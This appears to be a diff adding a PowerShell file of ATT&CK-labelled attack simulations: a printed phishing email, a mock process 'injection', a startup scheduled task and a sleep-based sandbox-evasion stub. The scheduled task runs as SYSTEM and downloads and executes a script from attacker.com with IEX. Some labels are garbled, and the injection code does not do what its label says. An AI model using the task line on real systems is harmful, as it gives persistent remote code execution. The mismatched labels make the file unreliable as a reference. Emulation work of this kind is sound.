@@ -1,0 +1,102 @@
+
+T1566 Phishing attack
+
+# Define a list of common email domains
+$emailDomains = @("gmail.com", "yahoo.com", "outlook.com", "example.com")
+
+ 
+
+# Generate a random recipient email address
+$recipient = "victim@" + $emailDomains[(Get-Random -Minimum 0 -Maximum ($emailDomains.Length))]
+
+ 
+
+# Generate a random sender name and email address
+$senderName = "John Doe"
+$senderEmail = "sender@" + $emailDomains[(Get-Random -Minimum 0 -Maximum ($emailDomains.Length))]
+
+ 
+
+# Generate a random subject for the email
+$subjects = @("Important Account Verification", "Urgent Security Alert", "Win a Prize Today", "Update Your Password")
+$subject = $subjects[(Get-Random -Minimum 0 -Maximum ($subjects.Length))]
+
+ 
+
+# Generate a random body message
+$body = @"
+Dear $recipient,
+
+We have detected suspicious activity on your account. Please click the link below to verify your account information.
+
+ 
+
+www.maliciouslink.com
+
+ 
+
+If you did not perform this action, please ignore this email.
+
+ 
+
+Sincerely,
+$senderName
+"@
+
+ 
+
+# Output the phishing email
+Write-Host "Recipient: $recipient"
+Write-Host "Sender: $senderName <$senderEmail>"
+Write-Host "Subject: $subject"
+Write-Host "Message:"
+Write-Host $body
+
+
+
+$processName = "powershell"
+$payload = "Injection" #payload name
+
+ 
+
+ T1105 - ingress toll transfer
+
+$process = Get-Process -Name $processName -ErrorAction SilentlyContinue
+if ($process) {
+    $process | Add-Member -NotePropertyName "Injected" -NotePropertyValue $payload
+    Write-Host "Payload injected into process '$processName': $payload"
+} else {
+    Write-Host "Process '$processName' not found."
+}
+
+
+T1053-Scheduled Task
+
+$Action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'Invoke-Expression "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/malicious.ps1')"'
+Register-ScheduledTask -Action $Action -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName 'MaliciousTask' -User 'NT AUTHORITY\SYSTEM'
+
+# Set the delay time in seconds
+$delaySeconds = 60
+
+ 
+T1497-Virturalization/Sandbox Evasion
+
+
+# Display a message indicating the start of the delay
+Write-Host "Delaying execution for $delaySeconds seconds..."
+
+ 
+
+# Sleep for the specified duration
+Start-Sleep -Seconds $delaySeconds
+
+ 
+
+# After the delay, perform some malicious action (e.g., create a file)
+$maliciousAction = "Malicious action performed after delay."
+$maliciousAction | Out-File -FilePath C:\malicious.txt -Encoding ASCII
+
+ 
+
+# Display a message indicating the completion of the malicious action
+Write-Host "Malicious action completed: $maliciousAction"
